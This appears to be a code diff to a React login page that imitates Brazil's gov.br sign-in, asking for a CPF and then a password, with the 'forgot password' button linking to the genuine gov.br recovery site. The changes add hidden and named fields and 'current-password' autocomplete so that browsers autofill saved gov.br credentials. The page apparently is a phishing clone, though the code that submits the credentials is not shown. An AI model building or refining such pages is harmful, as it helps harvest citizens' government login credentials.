@@ -130,13 +130,15 @@ export default function LoginPage() {
                 <form onSubmit={handleCpfSubmit}>
                   <label className="gov-label">CPF</label>
                   <input
+                    id="cpf"
+                    name="username"
                     type="tel"
                     inputMode="numeric"
                     className="gov-input"
                     placeholder="Digite seu CPF"
                     value={cpf}
                     onChange={handleCpfChange}
-                    autoComplete="new-password"
+                    autoComplete="username"
                     required
                   />
 
@@ -196,7 +198,8 @@ export default function LoginPage() {
             )}
 
             {step === 2 && (
-              <div className="gov-step2-form" style={{width: '100%'}}>
+              <form onSubmit={handleLogin} className="gov-step2-form" style={{width: '100%'}}>
+                <input type="text" name="username" value={cpf} readOnly autoComplete="username" style={{display: 'none'}} />
                 <h3 className="gov-card-title">Digite sua senha</h3>
                 <label className="gov-label" style={{marginBottom: '4px'}}>CPF</label>
                 <h4 className="gov-cpf-display" style={{fontSize: '18px', fontWeight: '600', margin: '0 0 20px 0', color: '#333'}}>{cpf}</h4>
@@ -206,13 +209,13 @@ export default function LoginPage() {
                   <div style={{position: 'relative'}}>
                     <input 
                       id="password"
+                      name="password"
                       type={showPassword ? "text" : "password"} 
                       className="gov-input" 
                       placeholder="Digite sua senha atual"
                       value={password}
                       onChange={(e) => { setPassword(e.target.value); setErrorMsg(''); }}
-                      onKeyPress={handleKeyPressPassword}
-                      autoComplete="new-password"
+                      autoComplete="current-password"
                       autoFocus
                       required
                     />
@@ -235,16 +238,16 @@ export default function LoginPage() {
                   <div className="gov-button-panel-between" style={{display: 'flex', justifyContent: 'space-between', gap: '0.5rem', margin: '2rem 0 1rem 0'}}>
                     <button className="gov-btn-outline" type="button" onClick={handleCancel}>Cancelar</button>
                     <button 
+                      type="submit"
                       className={`gov-btn-primary ${isLoading ? 'gov-btn-loading' : ''}`}
-                      onClick={handleLogin}
                       disabled={isLoading}
                     >
                       {isLoading ? '' : 'Entrar'}
                     </button>
                   </div>
-                  <button className="gov-forgot-link" style={{marginTop: '0rem', marginBottom: '1rem', background: 'none', border: 'none', boxShadow: 'none', padding: '0', color: '#1351b4', fontWeight: '500', cursor: 'pointer', width: '100%', textAlign: 'center'}} onClick={() => window.location.href = 'https://sso.acesso.gov.br/account-recovery'}>Esqueci minha senha</button>
+                  <button type="button" className="gov-forgot-link" style={{marginTop: '0rem', marginBottom: '1rem', background: 'none', border: 'none', boxShadow: 'none', padding: '0', color: '#1351b4', fontWeight: '500', cursor: 'pointer', width: '100%', textAlign: 'center'}} onClick={() => window.location.href = 'https://sso.acesso.gov.br/account-recovery'}>Esqueci minha senha</button>
                 </div>
-              </div>
+              </form>
             )}
           </div>
 
